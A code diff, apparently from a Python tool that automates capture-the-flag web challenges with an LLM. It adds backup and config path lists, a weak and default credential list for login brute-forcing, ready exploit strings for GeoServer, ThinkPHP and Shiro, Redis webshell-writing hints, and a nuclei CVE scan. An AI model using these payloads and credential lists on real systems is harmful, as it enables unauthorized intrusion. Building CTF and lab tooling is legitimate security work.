@@ -202,6 +202,13 @@ DIRS = [
     "/robots.txt", "/sitemap.xml", "/README.md", "/phpinfo.php", "/info.php", "/test", "/debug", "/debug/config",
     "/console", "/shell", "/cmd", "/ping", "/status", "/metrics", "/version", "/server-status", "/healthz",
     "/flag", "/flag.txt", "/readme", "/admin/flag", "/api/flag", "/secret", "/private", "/internal", "/internal-api",
+    # 黑盒扩大（方案 5：目录是黑盒主信息源）
+    "/source", "/src", "/backup", "/backup.zip", "/backup.tar.gz", "/www.zip", "/web.zip", "/code.zip",
+    "/phpinfo.php", "/info", "/debug", "/debug/config", "/trace", "/graphql", "/graphiql", "/metrics",
+    "/swagger-ui.html", "/swagger-ui/", "/api-docs", "/api/swagger", "/v2/api-docs", "/v3/api-docs",
+    "/actuator/health", "/actuator/env", "/actuator/configprops", "/actuator/mappings",
+    "/server-status", "/server-info", "/test", "/demo", "/example", "/sample",
+    "/static/", "/assets/", "/js/", "/css/", "/img/", "/favicon.ico", "/manifest.json",
 ]
 
 # 常见登录口令（配合题目描述的预置账号；题目给出的口令由 LLM 直接使用）
@@ -217,6 +224,14 @@ WEAK_CREDS = [
     ("sysadmin", "sysadmin"), ("sysadmin", "123456"), ("administrator", "123456"),
     ("administrator", "admin123"), ("manager", "123456"), ("guest", "guest"),
     ("superadmin", "123456"), ("superadmin", "admin"), ("demo", "demo123"),
+    # 黑盒扩大（方案 5：CN 企业口令 + 产品默认口令）
+    ("editor", "Admin123"), ("editor", "123456"), ("editor", "editor"),
+    ("zhangwei", "zw123456"), ("zhangwei", "123456"), ("zhangwei", "Zhangwei123"),
+    ("viewer", "viewer"), ("viewer", "123456"), ("test", "Test123456!"),
+    ("admin", "1qaz@WSX"), ("admin", "P@ssword"), ("admin", "Admin@123456"), ("admin", "1qaz2wsx3edc"),
+    ("tomcat", "tomcat"), ("tomcat", "s3cret"), ("admin", "admin8888"), ("root", "toor123"),
+    ("redis", "redis"), ("1panel", "1panel_password"), ("grafana", "grafana"),
+    ("admin", "admin@2024"), ("admin", "Admin123!"), ("admin", "a123456789"), ("admin", "qwer1234"),
 ]
 
 # SQLi 探测（登录/查询参数）
@@ -613,6 +628,121 @@ def parallel_req(urls, workers=4, timeout=6, max_body=4000):
     return [r for r in results if r]
 
 
+# ── 技术栈指纹库（黑盒第一探测：识别即注入 hints，省 LLM 2-3 轮摸索）──
+TECH_FINGERPRINT = [
+    # (匹配特征（小写）, 技术栈 key, 注入的题型提示)
+    ("geoserver", "geoserver",
+     "指纹=GeoServer：优先 CVE-2024-36401（exec 表达式注入：/geoserver/ows?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'id')）；CVE-2023-25157（SQLi）；弱口令 admin/geoserver"),
+    ("1panel", "1panel",
+     "指纹=1Panel：CVE-2024-39907（未授权访问/命令执行）；/api/v1/auth/login；默认口令 1panel/1panel_password"),
+    ("sanic", "sanic",
+     "指纹=Sanic：cookie 解析支持八进制编码绕过；pydash 路径解析中 \\\\. 会被当作 . → 全局变量污染 __file__ 读 flag"),
+    ("next.js", "nextjs",
+     "指纹=Next.js：CVE-2025-55182（React2Shell，App Router RCE）；SSRF 中间件绕过"),
+    ("spring", "spring",
+     "指纹=Spring：/actuator/env 泄露（结合 refresh 提 RCE）；SpEL 注入；CVE-2022-22963/22965"),
+    ("thinkphp", "thinkphp",
+     "指纹=ThinkPHP：5.x RCE /index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"),
+    ("shiro", "shiro",
+     "指纹=Shiro：rememberMe 反序列化（默认密钥 kPH+bIxk5D2deZiIxcaaaA==）；ysoserial 链"),
+    ("flask", "flask",
+     "指纹=Flask/Werkzeug：debug 模式 console RCE；session 伪造（flask-unsign 弱密钥）"),
+    ("django", "django",
+     "指纹=Django：DEBUG=True 泄露（settings/secret）；模板注入；SECRET_KEY 伪造"),
+    ("express", "express",
+     "指纹=Node/Express：原型链污染（__proto__）；参数污染；SSRF；CVE-2025-55182"),
+    ("grafana", "grafana",
+     "指纹=Grafana：CVE-2024-9264（SQLi）；/public/plugins/ 路径遍历；/api/dashboards 未授权"),
+    ("jenkins", "jenkins",
+     "指纹=Jenkins：/script 未授权 console（groovy RCE）；CVE-2024-23897（CLI 任意文件读）"),
+    ("tomcat", "tomcat",
+     "指纹=Tomcat：manager 弱口令（tomcat/tomcat）→WAR 部署；CVE-2017-12615 PUT 写 JSP；AJP CVE-2020-1938"),
+    ("redis", "redis",
+     "指纹=Redis：未授权 → CONFIG SET dir /var/www/html + SAVE 写 webshell / cron / ssh-key"),
+    ("fastapi", "fastapi",
+     "指纹=FastAPI：/docs /openapi.json 接口枚举；参数注入；uvicorn 调试"),
+    ("wordpress", "wordpress",
+     "指纹=WordPress：wp-json 用户枚举；xmlrpc 爆破；插件漏洞"),
+    ("bottle", "bottle",
+     "指纹=Bottle(Python)：模板渲染 SSTI（{{7*7}}）；路由参数注入"),
+    ("dify", "dify",
+     "指纹=Dify(AI 平台)：提示注入；工作流越权；文件上传"),
+    ("rust", "rust",
+     "指纹=Rust 后端：并发竞态（TOCTOU）；整数溢出；PoW 绕过"),
+    ("go", "go",
+     "指纹=Go 后端：/debug/pprof 泄露；参数校验绕过；路径穿越"),
+]
+
+# ── 端口号题型信号（黑盒分类：910x=逆向 / 901x=内存安全 / 23=telnet...）──
+PORT_TYPES = [
+    ((9010, 9019), "memsafe", "端口 {p} 特征=TCP 行协议内存安全服务（缓存/令牌/心跳/缓冲区）→ 摸协议（HELP/STATUS）→ 超长输入/负数长度/格式串/心跳长度不匹配（pwntools 交互）。"),
+    ((9101, 9108), "reverse", "端口 {p} 特征=嵌入式授权/序列号校验 → 下载二进制（curl 首页）→ file/strings/objdump -d/gdb/ltrace 分析校验逻辑 → z3 求解序列号/授权码。"),
+    ((21,), "ftp", "端口 21 特征=FTP：匿名/弱口令 → 读 flag/凭据文件。"),
+    ((23,), "telnet", "端口 23 特征=Telnet：弱口令/协议漏洞。"),
+    ((6379,), "redis", "端口 6379 特征=Redis：未授权 → 写 webshell/cron/ssh-key。"),
+    ((3306,), "mysql", "端口 3306 特征=MySQL：弱口令 → 读库找 flag/凭据。"),
+    ((8443,), "https", "端口 8443 特征=HTTPS 面板：证书信息/弱口令/面板漏洞。"),
+    ((10086,), "panel", "端口 10086 特征=运维面板（1Panel 类）：默认口令 + CVE-2024-39907。"),
+]
+
+
+def port_hint(addr):
+    """端口号 → 题型提示（黑盒分类：端口本身就是信号）。无匹配返回空。"""
+    try:
+        port = int(addr.partition(":")[2] or 80)
+    except ValueError:
+        return ""
+    for rng, t, tmpl in PORT_TYPES:
+        if isinstance(rng, tuple):
+            if len(rng) == 2 and rng[0] <= port <= rng[1]:
+                return tmpl.format(p=port)
+            if len(rng) == 1 and port == rng[0]:
+                return tmpl.format(p=port)
+        elif port == rng:
+            return tmpl.format(p=port)
+    return ""
+
+
+def fingerprint_tech(base_url):
+    """黑盒第一探测：首页 + 常见指纹路径 → 返回技术栈 hint 列表（去重）。"""
+    hints = []
+    blob_all = ""
+    st, hd, body = http_req("GET", base_url + "/", timeout=6, max_body=20000)
+    if st:
+        blob_all += (str(hd) + body[:15000]).lower()
+    probe_paths = ["/actuator", "/wp-json/", "/server-info", "/geoserver/web", "/api",
+                   "/robots.txt", "/.git/HEAD", "/docs", "/openapi.json", "/admin"]
+    for u, st2, hd2, body2 in parallel_req([base_url + p for p in probe_paths], workers=6, timeout=4, max_body=3000):
+        if st2:
+            blob_all += (str(hd2) + body2[:2000]).lower()
+    for pat, key, hint in TECH_FINGERPRINT:
+        if pat in blob_all:
+            hints.append(hint)
+    return hints
+
+
+def nuclei_scan(base_url, timeout=60):
+    """黑盒已知 CVE 扫描（nuclei 已装 + 模板）：命中即返回 CVE 提示列表。"""
+    try:
+        r = subprocess.run(
+            ["nuclei", "-u", base_url, "-t", "/opt/nuclei-templates/http",
+             "-severity", "critical,high", "-c", "4", "-silent", "-jsonl"],
+            capture_output=True, text=True, timeout=timeout,
+            encoding="utf-8", errors="replace")
+        hits = []
+        for line in (r.stdout or "").splitlines():
+            try:
+                j = json.loads(line)
+                hits.append(f"nuclei 命中: {j.get('info', {}).get('name', '?')} @ {j.get('matched-at', '')}")
+            except ValueError:
+                continue
+        return hits
+    except subprocess.TimeoutExpired:
+        return []
+    except Exception:
+        return []
+
+
 def fingerprint(base_url):
     """首页/常见端点指纹（并发 4）：返回 (指纹摘要, 可访问端点列表, 发现的flag)"""
     found = []
@@ -665,7 +795,8 @@ def login_attempt(base_url, login_urls=None):
     results = []
     flags = []
     # 先找登录接口
-    candidates = login_urls or [base_url + p for p in ("/login", "/login.php", "/admin/login", "/admin/login.php", "/api/login", "/api/v1/login", "/user/login")]
+    candidates = login_urls or [base_url + p for p in ("/login", "/login.php", "/admin/login", "/admin/login.php", "/api/login", "/api/v1/login", "/user/login",
+                                                        "/admin", "/admin/login.html", "/signin", "/portal/login", "/api/auth/login", "/login.html", "/index.php/login")]
     login_found = []
     for u in candidates:
         st, hd, body = http_req("GET", u)
@@ -823,8 +954,16 @@ def detect_type(desc, code=""):
 
 
 def estimate_time(ch):
-    """预估单题耗时（分钟）——有实测经验用 EMA 平均（A 自适应），无经验用静态因子。"""
+    """预估单题耗时（分钟）——有实测经验用 EMA 平均（A 自适应），无经验用静态因子。
+    黑盒无描述时按端口信号辅助（910x 逆向 2.0 / 901x 内存安全 1.5）。"""
     type_key, type_factor = detect_type(ch.get("description") or "", ch.get("unique_code", ""))
+    if type_key == "web" and not (ch.get("description") or ""):
+        # 黑盒：无描述 → 端口号是唯一题型信号
+        ph = port_hint((ch.get("container_addr") or [""])[0])
+        if "嵌入式授权" in ph or "序列号" in ph:
+            type_factor = 2.0
+        elif "内存安全" in ph:
+            type_factor = 1.5
     flags = max(ch.get("flag_count", 1), 1)
     avg = _TYPE_AVG_TIME.get(type_key)
     if avg:
@@ -1269,6 +1408,22 @@ def solve_challenge(ch, pass_no=1, extra_hint=None):
         # 阶段A 命中 → 先提交（多 flag 题剩余部分交给阶段B）
         if flags_found:
             submit_all(unique_code, flags_found, submitted, rejected)
+
+    # ── 黑盒增强：指纹 → 技术栈 hints + 端口信号 + nuclei 已知 CVE（无描述时替代 detect_type） ──
+    if not enum_summary or "技术栈指纹命中" not in "".join(enum_summary):
+        tech_hints = fingerprint_tech(base_url)
+        if tech_hints:
+            enum_summary.insert(0, "技术栈指纹命中：\n" + "\n".join(tech_hints))
+            log(f"  🎯 指纹识别: {len(tech_hints)} 个技术栈命中")
+        ph = port_hint(addr)
+        if ph and not tech_hints:
+            enum_summary.insert(0, ph)
+            log(f"  🎯 端口信号: {ph[:60]}...")
+        if pass_no == 1 and not tech_hints:
+            n_hits = nuclei_scan(base_url)
+            if n_hits:
+                enum_summary.append("nuclei 扫描：" + "; ".join(n_hits))
+                log(f"  🎯 nuclei 命中 {len(n_hits)} 个已知漏洞")
 
     # ── 阶段B LLM 深度攻击（多 flag 循环：remaining>0 继续追） ──
     won = len(submitted)
